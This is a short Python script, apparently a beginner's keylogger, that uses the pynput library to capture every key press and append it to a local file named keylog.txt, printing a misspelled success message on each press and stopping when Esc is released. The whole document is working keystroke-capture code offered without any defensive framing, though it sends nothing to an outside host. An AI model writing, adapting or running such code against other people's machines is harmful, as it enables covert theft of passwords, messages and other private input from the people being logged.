from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    key_str = str(key)
    if key_str.startswith('Key.'):
        key_str = key_str[4:]
    with open(log_file, "a") as f:
        print("Keylogger run scuessfully")
        f.write(key_str + "\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()
